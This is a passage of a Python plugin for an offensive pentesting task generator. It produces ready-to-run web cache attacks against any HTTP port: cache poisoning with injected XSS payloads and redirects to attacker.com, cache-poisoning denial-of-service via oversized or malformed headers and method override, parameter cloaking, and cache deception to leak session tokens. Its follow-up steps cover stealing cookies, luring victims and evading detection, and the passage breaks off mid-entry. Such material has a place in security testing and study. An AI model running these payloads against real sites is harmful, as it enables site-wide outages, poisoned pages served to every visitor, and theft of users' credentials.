"""
Cache & Timing Attacks service plugin

Generates tasks for web cache exploitation and timing-based attacks including:
- Cache poisoning (unkeyed headers, parameter cloaking, XSS injection)
- Cache deception (steal sensitive data via cached responses)
- DoS via cache poisoning (HHO, HMC, HMO attacks)
- Race conditions (limit-overrun, hidden substates, time-sensitive)
- Timing attacks (parameter discovery, hidden endpoints, SSRF detection)

Extracted from HackTricks:
- pentesting-web/cache-deception/*.md
- pentesting-web/timing-attacks.md
- pentesting-web/race-condition.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class CacheTimingAttacksPlugin(ServicePlugin):
    """Cache poisoning, cache deception, race conditions, and timing attacks plugin"""

    @property
    def name(self) -> str:
        return "cache-timing"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8000, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP services that may use caching"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common HTTP ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate cache & timing attacks task tree"""
        scheme = 'https' if 'https' in service_info.get('service', '').lower() or port == 443 else 'http'
        base_url = f'{scheme}://{target}:{port}'

        tasks = {
            'id': f'cache-timing-{port}',
            'name': f'Cache & Timing Attacks (Port {port})',
            'type': 'parent',
            'children': []
        }

        # SECTION 1: Cache Discovery & Fingerprinting
        tasks['children'].append({
            'id': f'cache-discovery-{port}',
            'name': 'Cache Infrastructure Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'cache-headers-{port}',
                    'name': 'Identify Cache Headers',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -I {base_url}/',
                        'description': 'Check for cache-related headers to identify caching infrastructure',
                        'tags': ['QUICK_WIN', 'OSCP:HIGH', 'MANUAL', 'RECON'],
                        'flag_explanations': {
                            '-I': 'HEAD request only (fetch headers without body)',
                            base_url: 'Target web server'
                        },
                        'success_indicators': [
                            'X-Cache: hit/miss (Varnish, Fastly, CloudFlare)',
                            'CF-Cache-Status: HIT/MISS (Cloudflare)',
                            'Cache-Control: public, max-age=N (indicates caching)',
                            'Age: N (time object has been in cache)',
                            'Vary: User-Agent, Cookie (cache key dependencies)',
                            'X-Cache-Key: /path (cache key information)',
                            'Server: cloudflare, Varnish, AkamaiGHost'
                        ],
                        'failure_indicators': [
                            'No cache headers present',
                            'Cache-Control: private, no-cache, no-store',
                            'Pragma: no-cache'
                        ],
                        'next_steps': [
                            'Map which paths are cached vs dynamic',
                            'Test if error codes (400, 403, 404) are cached',
                            'Identify unkeyed headers with Param Miner',
                            'Check if static extensions (.js, .css, .png) are always cached'
                        ],
                        'alternatives': [
                            f'Manual: Browse to {base_url}/ and check Network tab headers',
                            'Burp Param Miner: Extensions > Guess headers',
                            f'nmap --script http-headers {target} -p {port}'
                        ],
                        'notes': 'Common cache headers: X-Cache (hit/miss), CF-Cache-Status, Age, Vary, Cache-Control. Presence indicates CDN/caching layer. Check response times - cached responses typically <50ms.'
                    }
                },
                {
                    'id': f'cache-test-error-codes-{port}',
                    'name': 'Test Error Code Caching',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -H "X-Bad-Header: \\r\\n" {base_url}/ -i',
                        'description': 'Send malformed request to trigger 400 error, then check if error is cached (DoS vulnerability)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            '-H': 'Add custom HTTP header',
                            'X-Bad-Header: \\r\\n': 'Inject CRLF characters (illegal header)',
                            '-i': 'Include response headers in output'
                        },
                        'success_indicators': [
                            '400 Bad Request on first request',
                            'Second normal request also returns 400 (cached)',
                            'X-Cache: HIT on subsequent requests'
                        ],
                        'failure_indicators': [
                            'Normal 200 response despite bad header',
                            'Error codes not cached (different responses each time)'
                        ],
                        'next_steps': [
                            'If error codes cached: test Cache Poisoning DoS',
                            'Try other illegal headers: oversized, null bytes, meta characters',
                            'Test HTTP Method Override with invalid methods'
                        ],
                        'alternatives': [
                            f'Manual: Send malformed request twice in Burp Repeater',
                            f'curl -H "Content-Type: HelloWorld" {base_url}/ (unexpected value)',
                            f'curl -H "X-Oversize: {"A"*10000}" {base_url}/ (HTTP Header Oversize)'
                        ],
                        'notes': 'Some CDNs (Akamai, Cloudflare) cache error responses. If cached, attacker can cause DoS by poisoning cache with errors. Test: bad header → 400 → re-request without header → still 400 = cached.'
                    }
                }
            ]
        })

        # SECTION 2: Cache Poisoning Attacks
        tasks['children'].append({
            'id': f'cache-poisoning-{port}',
            'name': 'Cache Poisoning Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'cache-poison-unkeyed-headers-{port}',
                    'name': 'Identify Unkeyed Headers (Param Miner)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use Burp Param Miner to discover unkeyed headers that affect response but not cache key',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'ENUM'],
                        'alternatives': [
                            'Burp Suite: Extensions > Param Miner > Guess headers',
                            'Manual: Test common headers (X-Forwarded-Host, X-Forwarded-For, X-Original-URL)',
                            'ffuf -w headers.txt -H "FUZZ: attacker.com" -u {base_url}/ -mc all'
                        ],
                        'success_indicators': [
                            'Header value reflected in response (HTML, JS, redirects)',
                            'Response differs when header added, but cache key unchanged',
                            'Param Miner reports: "Unkeyed input found: X-Forwarded-Host"'
                        ],
                        'next_steps': [
                            'Test XSS: X-Forwarded-Host: "><script>alert(1)</script>',
                            'Test Open Redirect: X-Forwarded-Host: attacker.com',
                            'Test JS hijacking: X-Forwarded-Host: attacker.com (if JS src= uses header)',
                            'Poison cache with malicious payload and verify other users receive it'
                        ],
                        'notes': 'Unkeyed inputs = parameters/headers that change response but are NOT part of cache key. Common: X-Forwarded-Host (CDN routing), X-Forwarded-For (IP tracking), X-Original-URL (routing). Exploit: inject payload → cache → all users XSSed.'
                    }
                },
                {
                    'id': f'cache-poison-xss-header-{port}',
                    'name': 'Cache Poisoning via Reflected Header (XSS)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -H "X-Forwarded-Host: \\"><script>alert(document.domain)</script>\\"" {base_url}/static/tracking.js -i',
                        'description': 'Inject XSS payload via unkeyed header, cache the response to XSS all users',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                        'flag_explanations': {
                            '-H': 'Set custom HTTP header',
                            'X-Forwarded-Host': 'Commonly reflected header (routing/CDN)',
                            '\\"><script>alert(1)</script>\\"': 'Break out of HTML context and execute JS',
                            '/static/tracking.js': 'Target cached static resource'
                        },
                        'success_indicators': [
                            'Payload reflected in response body or JS variable',
                            'X-Cache: MISS on first request, HIT on subsequent',
                            'alert() executes when accessing same URL without header',
                            'Other users accessing same path get XSSed'
                        ],
                        'failure_indicators': [
                            'Header not reflected in response',
                            'Response sanitizes input (HTML-encoded)',
                            'Error response not cached',
                            'CSP blocks inline scripts'
                        ],
                        'next_steps': [
                            'If XSS works: steal cookies (document.cookie), session tokens',
                            'If CSP present: test CSP bypass techniques',
                            'Target high-traffic pages for maximum impact',
                            'Test other unkeyed headers: X-Original-URL, X-Rewrite-URL'
                        ],
                        'alternatives': [
                            f'Manual Burp: Send to Repeater → Add header → Send until X-Cache: HIT',
                            f'curl -H "X-Forwarded-For: \\"><img src=x onerror=alert(1)>\\"" {base_url}/',
                            'Cookie injection: curl -H "Cookie: lang=en\\"><script>alert(1)</script>\\"" {base_url}/'
                        ],
                        'notes': 'Cache poisoning flow: 1) Find unkeyed header reflected in response 2) Inject payload 3) Keep requesting until cached (X-Cache: HIT) 4) All users get poisoned response. Static paths (.js, .css) more likely to cache. Use different cache busters (?v=1, ?v=2) to avoid detection.'
                    }
                },
                {
                    'id': f'cache-poison-open-redirect-{port}',
                    'name': 'Cache Poisoning via Open Redirect',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -H "X-Forwarded-Host: attacker.com" -H "X-Forwarded-Scheme: http" {base_url}/ -i',
                        'description': 'Poison cache to redirect all users to attacker-controlled domain',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'NOISY'],
                        'flag_explanations': {
                            'X-Forwarded-Host': 'Override hostname for redirects',
                            'X-Forwarded-Scheme: http': 'Force HTTP (server may auto-redirect to HTTPS)',
                            'attacker.com': 'Attacker-controlled domain to capture redirects'
                        },
                        'success_indicators': [
                            '301/302 redirect to attacker.com in Location header',
                            'X-Cache: HIT on subsequent requests',
                            'Normal requests (without header) redirect to attacker.com'
                        ],
                        'failure_indicators': [
                            'No redirect triggered',
                            'Redirect uses original domain (header ignored)',
                            'Cache-Control: private (not cached)'
                        ],
                        'next_steps': [
                            'Host malicious JS on attacker.com to steal credentials',
                            'Test on login pages to capture credentials',
                            'Combine with JS hijacking if tracking.js loads from reflected host'
                        ],
                        'alternatives': [
                            f'curl -H "Host: attacker.com" {base_url}/ (if Host header unkeyed)',
                            'Test X-Original-URL, X-Rewrite-URL headers',
                            'Manual: Burp Repeater with multiple headers'
                        ],
                        'notes': 'Multiple unkeyed headers may be required. Example: X-Forwarded-Scheme=http triggers HTTPS redirect, X-Forwarded-Host=attacker.com controls redirect destination. Rack middleware (Ruby on Rails) commonly vulnerable.'
                    }
                },
                {
                    'id': f'cache-poison-dos-{port}',
                    'name': 'Cache Poisoning DoS Attacks',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cache-dos-hho-{port}',
                            'name': 'HTTP Header Oversize (HHO) DoS',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -H "X-Oversize-Header: {"A"*8192}" {base_url}/ -i',
                                'description': 'Send oversized header to trigger 400 error that gets cached (DoS)',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'NOISY'],
                                'flag_explanations': {
                                    'X-Oversize-Header': 'Custom header name',
                                    '{"A"*8192}': 'Python syntax - 8KB of "A" characters (exceeds web server limit)',
                                    '-i': 'Include response headers'
                                },
                                'success_indicators': [
                                    '400 Bad Request (header too large)',
                                    'X-Cache: HIT on subsequent normal requests',
                                    'Normal requests return cached 400 error'
                                ],
                                'failure_indicators': [
                                    'Request accepted (200 OK)',
                                    'Error not cached (each request returns 200)',
                                    'Connection reset/timeout'
                                ],
                                'next_steps': [
                                    'If cached: DoS entire site by poisoning popular pages',
                                    'Test on critical paths: /, /login, /api/*',
                                    'Use different header sizes to find sweet spot (cache accepts, origin rejects)'
                                ],
                                'alternatives': [
                                    'Manual: Burp Repeater → Add huge header → Send twice',
                                    'Python: requests.get(url, headers={"X-Big": "A"*10000})',
                                    'Test with legitimate headers: Cookie, User-Agent (more likely cached)'
                                ],
                                'notes': 'HHO exploits size difference between cache server (high limit) and origin server (low limit). Cache stores 400 error with URL as key. All subsequent requests to that URL get cached error = DoS. Akamai, Cloudflare vulnerable. Test with 4KB, 8KB, 16KB headers.'
                            }
                        },
                        {
                            'id': f'cache-dos-hmc-{port}',
                            'name': 'HTTP Meta Character (HMC) DoS',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -H "X-Meta-Header: BadChars\\r\\n\\x00" {base_url}/ -i',
                                'description': 'Send header with illegal characters (CRLF, null bytes) to trigger cached error',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'NOISY'],
                                'flag_explanations': {
                                    'X-Meta-Header': 'Custom header',
                                    '\\r\\n': 'Carriage return + line feed (illegal in headers)',
                                    '\\x00': 'Null byte (illegal character)',
                                    '-i': 'Show response headers'
                                },
                                'success_indicators': [
                                    '400 Bad Request (illegal header)',
                                    'X-Cache: HIT on normal requests',
                                    'Site DoS for all users'
                                ],
                                'failure_indicators': [
                                    'Characters stripped/ignored',
                                    'Normal 200 response',
                                    'Error not cached'
                                ],
                                'next_steps': [
                                    'Test other illegal chars: \\t, \\v, \\f, \\0',
                                    'Try minimal payload: curl -H "\\: " {base_url}/',
                                    'Test on API endpoints (/api/*, /v1/*)'
                                ],
                                'alternatives': [
                                    'curl -H ": " {base_url}/ (minimal illegal header)',
                                    'Burp: Repeater → Edit header raw bytes → Insert 0x0D 0x0A',
                                    'Test Content-Type: curl -H "Content-Type: Hello\\nWorld" {base_url}/'
                                ],
                                'notes': 'RFC7230 defines legal header characters. Servers may forward illegal headers to origin while cache stores result. Meta chars: CRLF (\\r\\n), null (\\x00), tab (\\t). Akamai forwards backslash and caches 400. Test minimal payload: just "\\: " as header.'
                            }
                        },
                        {
                            'id': f'cache-dos-hmo-{port}',
                            'name': 'HTTP Method Override (HMO) DoS',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -X GET -H "X-HTTP-Method-Override: DELETE" {base_url}/api/resource -i',
                                'description': 'Override HTTP method to unsupported one, cache the error response',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                                'flag_explanations': {
                                    '-X GET': 'Send GET request',
                                    'X-HTTP-Method-Override: DELETE': 'Tell server to treat as DELETE (unsupported)',
                                    '/api/resource': 'API endpoint (more likely to support method override)'
                                },
                                'success_indicators': [
                                    '405 Method Not Allowed',
                                    'X-Cache: HIT on subsequent GETs',
                                    'Normal GET requests return cached 405'
                                ],
                                'failure_indicators': [
                                    'Header ignored (normal GET response)',
                                    'Error not cached',
                                    'Method override not supported'
                                ],
                                'next_steps': [
                                    'Test other override headers: X-Method-Override, X-HTTP-Method',
                                    'Try invalid methods: TRACE, TRACK, FOO',
                                    'Target REST APIs (/api/v1/*, /rest/*)'
                                ],
                                'alternatives': [
                                    'curl -H "X-Method-Override: POST" {base_url}/static/file.js',
                                    'Burp: Repeater → Add override header → Send until HIT',
                                    'Test GCP buckets: X-HTTP-Method-Override: HEAD (empty response)'
                                ],
                                'notes': 'Many frameworks support method override headers for REST APIs (X-HTTP-Method-Override, X-Method-Override). If cache keys on URL only (not method), overriding to unsupported method causes 405 that gets cached. GCP buckets support PURGE method. GitLab + GCP vulnerable.'
                            }
                        },
                        {
                            'id': f'cache-dos-fat-get-{port}',
                            'name': 'Fat GET DoS',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -X GET {base_url}/ -H "Content-Length: 3" -d "xyz" -i',
                                'description': 'Send GET request with body to trigger 400 error (cached DoS)',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                                'flag_explanations': {
                                    '-X GET': 'GET request (should not have body)',
                                    '-H "Content-Length: 3"': 'Indicate body present',
                                    '-d "xyz"': 'Add body data (illegal for GET)',
                                    '-i': 'Show headers'
                                },
                                'success_indicators': [
                                    '400 Bad Request or 403 Forbidden',
                                    'X-Cache: HIT on normal requests',
                                    'Site DoS'
                                ],
                                'failure_indicators': [
                                    'Body ignored (200 OK)',
                                    'Error not cached'
                                ],
                                'next_steps': [
                                    'Test on different endpoints',
                                    'Combine with parameter cloaking',
                                    'Try HEAD requests with body'
                                ],
                                'alternatives': [
                                    'Burp: Repeater → GET with body',
                                    'Python: requests.get(url, data="xyz")',
                                    'Test POST with wrong Content-Type'
                                ],
                                'notes': 'Some servers/WAFs block GET with body. If cache accepts but origin blocks, cached 400/403. Cloudflare blocks this. Used in GitHub fat GET bug. Combine with param cloaking for cache poisoning exploitation.'
                            }
                        }
                    ]
                },
                {
                    'id': f'cache-poison-advanced-{port}',
                    'name': 'Advanced Cache Poisoning Techniques',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cache-fat-get-exploit-{port}',
                            'name': 'Fat GET Parameter Cloaking',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -X GET "{base_url}/contact/report-abuse?report=victim" -H "Content-Type: application/x-www-form-urlencoded" -d "report=attacker" -i',
                                'description': 'Send GET with URL param + body param (cache uses URL, server uses body)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    '?report=victim': 'URL parameter (cache key)',
                                    '-d "report=attacker"': 'Body parameter (server uses this)',
                                    'Content-Type: application/x-www-form-urlencoded': 'Form data in body'
                                },
                                'success_indicators': [
                                    'Server uses body value (report=attacker processed)',
                                    'Cache keys on URL value (victim profile cached)',
                                    'X-Cache: HIT when accessing ?report=victim',
                                    'Victim sees attacker content when visiting their URL'
                                ],
                                'failure_indicators': [
                                    'Body ignored (server uses URL param)',
                                    'GET with body rejected (400 error)',
                                    'Cache keys on entire request (body included)'
                                ],
                                'next_steps': [
                                    'Test on profile pages, abuse reports, contact forms',
                                    'Escalate: poison victim profile to include malicious JS',
                                    'Test parameter pollution: ?id=1&id=2 (which does server use?)'
                                ],
                                'alternatives': [
                                    'Burp: Repeater → GET → Add body → Compare responses',
                                    'Test Ruby param separator: ?report=victim;report=attacker',
                                    'Test URL encoding: ?report=victim&report%00=attacker'
                                ],
                                'notes': 'Fat GET exploits parser inconsistency: cache keys on URL param, server processes body param. James Kettle found this in GitHub. Cache stores response for victim URL but content is attacker-controlled. PortSwigger lab: Web cache poisoning via a fat GET request.'
                            }
                        },
                        {
                            'id': f'cache-param-cloaking-{port}',
                            'name': 'Parameter Cloaking with Delimiters',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl "{base_url}/js/tracking.js?callback=innocentFunc;callback=alert;evil=1" -i',
                                'description': 'Hide unkeyed param inside keyed param using alternative delimiter (;)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    '?callback=innocentFunc': 'Keyed parameter (cache key includes this)',
                                    ';callback=alert': 'Semicolon delimiter (Ruby on Rails treats ; like &)',
                                    ';evil=1': 'Hidden unkeyed parameter (not in cache key)'
                                },
                                'success_indicators': [
                                    'Server processes second callback=alert (semicolon parsed)',
                                    'Cache keys on callback=innocentFunc only (ignores ;-params)',
                                    'X-Cache: HIT with poisoned response',
                                    'JavaScript callback executes alert() instead of innocentFunc'
                                ],
                                'failure_indicators': [
                                    'Semicolon not parsed as delimiter (entire string treated as value)',
                                    'Cache includes semicolon params in key',
                                    'Server ignores params after semicolon'
                                ],
                                'next_steps': [
                                    'Test on JSONP endpoints (callback parameter)',
                                    'Try other delimiters: # (fragment), %00 (null byte)',
                                    'Test parameter pollution: which param does server use (first/last)?'
                                ],
                                'alternatives': [
                                    'Burp: Repeater → Test ;, #, %00 delimiters',
                                    'curl "{base_url}/api/data?id=1%00&id=2" (null byte delimiter)',
                                    'curl "{base_url}/callback?cb=safe#cb=evil" (fragment delimiter)'
                                ],
                                'notes': 'Ruby on Rails parses ; as & for parameters. Cache may only key on standard & params, ignoring ;-params. Allows hiding malicious params inside keyed params. Test JSONP callbacks for XSS: ?callback=safe;callback=alert. PortSwigger lab: Parameter cloaking.'
                            }
                        },
                        {
                            'id': f'cache-poison-vary-header-{port}',
                            'name': 'Cache Poisoning with Vary Header Targeting',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -H "User-Agent: VictimBrowser/1.0" -H "X-Forwarded-Host: attacker.com" {base_url}/ -i',
                                'description': 'Target specific User-Agent if Vary header includes it (precision poisoning)',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                                'flag_explanations': {
                                    'User-Agent: VictimBrowser/1.0': 'Match victim User-Agent (if known)',
                                    'X-Forwarded-Host: attacker.com': 'Unkeyed header for poisoning',
                                    'Vary header': 'Server response indicates User-Agent is part of cache key'
                                },
                                'success_indicators': [
                                    'Response includes Vary: User-Agent header',
                                    'X-Cache: HIT for requests with same User-Agent',
                                    'Only users with matching User-Agent see poisoned content',
                                    'Can target specific browsers/versions'
                                ],
                                'failure_indicators': [
                                    'No Vary header in response',
                                    'Vary: * (cache disabled)',
                                    'Cannot determine victim User-Agent'
                                ],
                                'next_steps': [
                                    'Fingerprint victim User-Agent (analytics, logs, social engineering)',
                                    'Target common User-Agents: Chrome, Firefox, Safari mobile',
                                    'Test if Accept-Language also in Vary (target by language)',
                                    'Combine with Cookie poisoning if Vary: Cookie present'
                                ],
                                'alternatives': [
                                    'Burp: Match & Replace → Set specific User-Agent',
                                    'curl -A "Mozilla/5.0..." -H "X-Host: evil" {base_url}/',
                                    'Test Vary: Accept-Encoding with gzip/deflate targeting'
                                ],
                                'notes': 'Vary header defines additional cache key components beyond URL. Common: Vary: User-Agent, Accept-Encoding, Cookie. If Vary: User-Agent, must poison with victim exact User-Agent string. Reduces attack surface but enables precision targeting. Test with different browsers before mass poisoning.'
                            }
                        }
                    ]
                }
            ]
        })

        # SECTION 3: Cache Deception (Steal Sensitive Data)
        tasks['children'].append({
            'id': f'cache-deception-{port}',
            'name': 'Cache Deception Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'cache-deception-static-extension-{port}',
                    'name': 'Cache Deception via Static Extension',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl {base_url}/account/profile.php/test.js -i',
                        'description': 'Append static extension to dynamic page, cache stores sensitive response',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            '/account/profile.php': 'Dynamic page with sensitive user data',
                            '/test.js': 'Fake static file (cache sees .js extension)',
                            '-i': 'Show cache headers'
                        },
                        'success_indicators': [
                            'Cache-Control: public, max-age=N (static resource cached)',
                            'X-Cache: MISS first request, HIT second request',
                            'Response contains sensitive data (user profile, tokens)',
                            'Content-Type: text/html (actual type) but cached as .js',
                            'Victim visits {base_url}/account/profile.php/test.js while authenticated',
                            'Attacker visits same URL (no auth) and sees victim data'
                        ],
                        'failure_indicators': [
                            '404 Not Found (path traversal detected)',
                            'Redirect to /account/profile.php (extension stripped)',
                            'Cache-Control: private, no-store (not cached)',
                            'Cache keys on full path including extension'
                        ],
                        'next_steps': [
                            'Test variations: .css, .png, .jpg, .avif (lesser-known)',
                            'Try path traversal: /profile.php/../test.js',
                            'Test URL encoding: /profile.php/%2e%2e/test.js',
                            'Target high-value endpoints: /api/user, /settings, /admin'
                        ],
                        'alternatives': [
                            f'curl {base_url}/api/token/.css (API endpoints)',
                            f'curl {base_url}/admin/users/.js (admin pages)',
                            f'Lure victim to {base_url}/private-data/nonexistent.png',
                            'Manual: Visit URL as victim → Visit as attacker → Verify data leaked'
                        ],
                        'notes': 'Cache deception: attacker causes victim to load URL that caches their sensitive data, then retrieves cached data. Works when: 1) Cache keys on URL without distinguishing dynamic/static 2) Cache matches on extension (.js, .css) 3) Origin serves sensitive data for /path/file.ext. Cloudflare caches 50+ extensions. HackerOne #593712: Cloudflare API key leak.'
                    }
                },
                {
                    'id': f'cache-deception-url-discrepancies-{port}',
                    'name': 'Cache Deception via URL Parser Discrepancies',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cache-deception-delimiters-{port}',
                            'name': 'Test Delimiter Discrepancies',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl {base_url}/api/account;matrix=ignored/test.js -i',
                                'description': 'Test if cache and origin parse delimiters differently (;, ., null byte)',
                                'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                                'flag_explanations': {
                                    '/api/account': 'Dynamic endpoint with sensitive data',
                                    ';matrix=ignored': 'Semicolon delimiter (Spring matrix variables)',
                                    '/test.js': 'Static extension (cache trigger)',
                                    '-i': 'Show cache headers'
                                },
                                'success_indicators': [
                                    'Cache stores as /test.js (sees ; as path separator)',
                                    'Origin serves /api/account (ignores ;matrix)',
                                    'X-Cache: HIT on second request',
                                    'Sensitive data cached under static-looking path'
                                ],
                                'failure_indicators': [
                                    '404 Not Found',
                                    'Cache and origin parse identically',
                                    'Not cached (Cache-Control: private)'
                                ],
                                'next_steps': [
                                    'Test other delimiters: . (Ruby), %00 (null), \\n (newline)',
                                    'curl {base_url}/MyAccount.css (Rails dot format)',
                                    'curl {base_url}/api/token%00aaa/test.js (OpenLiteSpeed null)',
                                    'curl {base_url}/account%0aaa/test.js (Nginx newline)'
                                ],
                                'alternatives': [
                                    'Spring (;): {base_url}/profile;foo=bar/test.js',
                                    'Rails (.): {base_url}/dashboard.json (format specifier)',
                                    'OpenLiteSpeed (%00): {base_url}/api%00/test.css',
                                    'Nginx (\\n): {base_url}/data%0a/test.png'
                                ],
                                'notes': 'Delimiter discrepancy: cache and origin parse URL delimiters differently. Spring: ; for matrix vars. Rails: . for format (MyAccount.css → MyAccount). OpenLiteSpeed: %00 truncates. Nginx: \\n separates. Cache keys on post-delimiter path, origin resolves pre-delimiter path. Test by sending delimiter + static extension and check if sensitive data cached.'
                            }
                        },
                        {
                            'id': f'cache-deception-normalization-{port}',
                            'name': 'Test Path Normalization Discrepancies',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl {base_url}/api/session%3Fparam/test.js -i',
                                'description': 'Test URL encoding/decoding differences between cache and origin',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    '/api/session': 'Sensitive endpoint',
                                    '%3F': 'URL-encoded ? (question mark)',
                                    'param': 'Looks like query param to origin',
                                    '/test.js': 'Static extension for cache'
                                },
                                'success_indicators': [
                                    'Cache keys on %3Fparam/test.js (no normalization)',
                                    'Origin decodes to /api/session?param and serves session data',
                                    'X-Cache: HIT with sensitive data',
                                    'Content-Type mismatch (HTML cached as JS)'
                                ],
                                'failure_indicators': [
                                    'Cache and origin decode identically',
                                    '404 or redirect',
                                    'Not cached'
                                ],
                                'next_steps': [
                                    'Test other encoded chars: %2F (slash), %2E (dot), %3B (semicolon)',
                                    'curl {base_url}/api/token%2F%2e%2e%2Ftest.js (dot segment)',
                                    'Test CDN normalization: {base_url}/static/../api/session',
                                    'Check OpenAI ChatGPT vuln: /share/%2F..%2Fapi/auth/session'
                                ],
                                'alternatives': [
                                    'Dot segments: {base_url}/profile/..%2Fstatic/test.js',
                                    'Double encoding: {base_url}/api%252Fdata/test.css',
                                    'Mixed case: {base_url}/API/Token/test.js',
                                    'Backslash: {base_url}/api\\..\\test.js (Windows normalization)'
                                ],
                                'notes': 'Normalization discrepancy: cache and origin normalize URLs differently (decode, dot-segment removal). CDNs may not normalize %2F..%2F but origin does. OpenAI bug: /share/%2F..%2Fapi/auth/session - CDN cached /share/*, origin normalized to /api/auth/session. Test encoded delimiters, dot segments (/../), double encoding. If cache stores raw path but origin normalizes, can cache sensitive paths.'
                            }
                        },
                        {
                            'id': f'cache-deception-static-dirs-{port}',
                            'name': 'Static Directory + Dot Segments',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl {base_url}/static/..%2Fapi/session -i',
                                'description': 'Use static directory with dot-segment to cache dynamic content',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    '/static': 'Well-known static directory (always cached)',
                                    '..%2F': 'URL-encoded dot-segment (../) for traversal',
                                    '/api/session': 'Target sensitive endpoint'
                                },
                                'success_indicators': [
                                    'Cache sees /static/* and caches (always-cache rule)',
                                    'Origin normalizes to /api/session (serves sensitive data)',
                                    'X-Cache: HIT on subsequent requests',
                                    'Cache key: /static/..%2Fapi/session, Response: session token'
                                ],
                                'failure_indicators': [
                                    '404 or 403 (traversal blocked)',
                                    'Redirect to /api/session',
                                    'Cache-Control: no-cache'
                                ],
                                'next_steps': [
                                    'Test other static dirs: /assets, /media, /public, /wp-content',
                                    'Test specific static files: /static/../favicon.ico, /assets/../robots.txt',
                                    'Combine with delimiters: /static;foo=bar/../api/data',
                                    'Test backslash: /static/..\\api/session'
                                ],
                                'alternatives': [
                                    'curl {base_url}/assets/..%5Capi/token (backslash)',
                                    'curl {base_url}/public/../admin/users',
                                    'curl {base_url}/media/..%2F..%2Fapi/keys',
                                    'curl {base_url}/static/%2e%2e%2fapi/session (double-encoded)'
                                ],
                                'notes': 'CDNs auto-cache specific directories: /static, /assets, /public, /wp-content, /media. Combine with dot-segment traversal to cache sensitive paths. Cache rule: "/static/* → cache", but origin normalizes ../. Result: dynamic content cached under static path. Test: send request → verify X-Cache: HIT → access as different user → leak data.'
                            }
                        },
                        {
                            'id': f'cache-deception-cspt-ato-{port}',
                            'name': 'CSPT-Assisted Cache Deception (Account Takeover)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Client-Side Path Traversal + cache deception to leak auth tokens via CDN',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'ADVANCED'],
                                'success_indicators': [
                                    'SPA concatenates user input into API URL',
                                    'API endpoint requires auth header (X-Auth-Token, Bearer)',
                                    'Appending .css/.js extension makes CDN cache response',
                                    'Client normalizes ../../../ in fetch() URL',
                                    'Victim loads: /user?userId=../../../v1/token.css',
                                    'SPA fetches: /v1/users/info/../../../v1/token.css → /v1/token.css',
                                    'CDN caches token JSON as public static asset',
                                    'Attacker retrieves: /v1/token.css (no auth needed)'
                                ],
                                'failure_indicators': [
                                    'No CSPT in SPA (input sanitized)',
                                    'CDN does not cache .css/.js for API paths',
                                    'CDN varies on auth header (cache key includes token)',
                                    'Origin marks API as non-cacheable and CDN respects it'
                                ],
                                'next_steps': [
                                    '1. Find SPA endpoint with path concatenation (search JS for apiUrl + param)',
                                    '2. Test CSPT: /?param=../../../../test → /api/base/../../../../test',
                                    '3. Identify auth API endpoint: /api/v1/token, /auth/session, /user/profile',
                                    '4. Test extension-based caching: /v1/token.css, /v1/token.js',
                                    '5. Confirm cache: X-Cache: HIT, Cache-Control: public, max-age=N',
                                    '6. Craft exploit URL: /user?userId=../../../v1/token.css',
                                    '7. Lure victim → retrieve cached token from /v1/token.css'
                                ],
                                'alternatives': [
                                    'Test other static extensions: .json, .jpg, .png, .woff',
                                    'Test fragment: /v1/token#.css (some parsers strip fragment)',
                                    'Test semicolon: /v1/token;.css',
                                    'Manual: Burp Proxy → Find fetch() calls → Inject ../'
                                ],
